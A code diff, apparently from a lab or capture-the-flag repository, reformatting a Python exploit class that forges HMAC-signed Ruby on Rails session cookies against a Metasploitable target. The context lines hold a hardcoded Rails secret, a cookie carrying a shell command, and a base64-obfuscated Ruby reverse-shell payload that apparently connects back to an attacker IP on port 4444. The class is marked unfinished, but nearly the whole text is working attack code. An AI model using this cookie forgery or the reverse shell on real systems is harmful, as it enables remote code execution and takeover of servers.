@@ -14,6 +14,7 @@ Cookie: _metasploitable=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRl
 
 ruby_reverse = "eval(%(Y29kZSA9ICUoY21WeGRXbHlaU0FuYzI5amEyVjBKenRqUFZSRFVGTnZZMnRsZEM1dVpYY29JakV3TGpjdU5EZ3VNVE0ySWl3Z05EUTBOQ2s3SkhOMFpHbHVMbkpsYjNCbGJpaGpLVHNrYzNSa2IzVjBMbkpsYjNCbGJpaGpLVHNrYzNSa1pYSnlMbkpsYjNCbGJpaGpLVHNrYzNSa2FXNHVaV0ZqYUY5c2FXNWxlM3hzZkd3OWJDNXpkSEpwY0R0dVpYaDBJR2xtSUd3dWJHVnVaM1JvUFQwd095aEpUeTV3YjNCbGJpaHNMQ0p5WWlJcGUzeG1aSHdnWm1RdVpXRmphRjlzYVc1bElIdDhiM3dnWXk1d2RYUnpLRzh1YzNSeWFYQXBJSDE5S1NCeVpYTmpkV1VnYm1sc0lIMD0pLnVucGFjayglKG0wKSkuZmlyc3QKaWYgUlVCWV9QTEFURk9STSA9fiAvbXN3aW58bWluZ3d8d2luMzIvCmlucCA9IElPLnBvcGVuKCUocnVieSksICUod2IpKSByZXNjdWUgbmlsCmlmIGlucAppbnAud3JpdGUoY29kZSkKaW5wLmNsb3NlCmVuZAplbHNlCmlmICEgUHJvY2Vzcy5mb3JrKCkKZXZhbChjb2RlKSByZXNjdWUgbmlsCmVuZAplbmQ=).unpack(%(m0)).first)"
 
+
 class RubyonRailsExploit:
     # NOT FINISHED
     def __init__(self, host, port):
@@ -23,15 +24,15 @@ class RubyonRailsExploit:
         self.__version = 3
         self.__path = "/flag"
         self.__name = "_metasploitable"
-        self.__secret = bytes("a7aebc287bba0ee4e64f947415a94e5f", 'utf-8')
+        self.__secret = bytes("a7aebc287bba0ee4e64f947415a94e5f", "utf-8")
 
     def __craft(self):
-        self.__msg = bytes("ls -lart", 'utf-8')
+        self.__msg = bytes("ls -lart", "utf-8")
         self.__digest = HMAC.new(self.__secret, self.__msg, SHA1).hexdigest()
-        #self.__digest = hmac.new(self.__secret, self.__msg, hashlib.sha1).hexdigest()
-        self.__data = str(urlsafe_b64encode(self.__msg), 'utf-8')
+        # self.__digest = hmac.new(self.__secret, self.__msg, hashlib.sha1).hexdigest()
+        self.__data = str(urlsafe_b64encode(self.__msg), "utf-8")
         self.__cookie = f"{self.__data}--{self.__digest}"
-        #self.__cookie = str(urlsafe_b64encode(bytes(self.__data, 'utf-8')), 'utf-8')
+        # self.__cookie = str(urlsafe_b64encode(bytes(self.__data, 'utf-8')), 'utf-8')
 
     def __retrieve(self):
         r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
@@ -42,11 +43,11 @@ class RubyonRailsExploit:
                 print(f"Cookie: {i.name} Value: {i.value}")
 
     def __exploit(self):
-        sploit = {
-            "Cookie": f"{self.__name}={self.__cookie}"
-        }
+        sploit = {"Cookie": f"{self.__name}={self.__cookie}"}
         print(f"Cookie: {self.__cookie}")
-        r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__path}", headers=sploit)
+        r = self.__requests.get(
+            f"http://{self.__host}:{self.__port}{self.__path}", headers=sploit
+        )
         print(r.text)
         return False
 
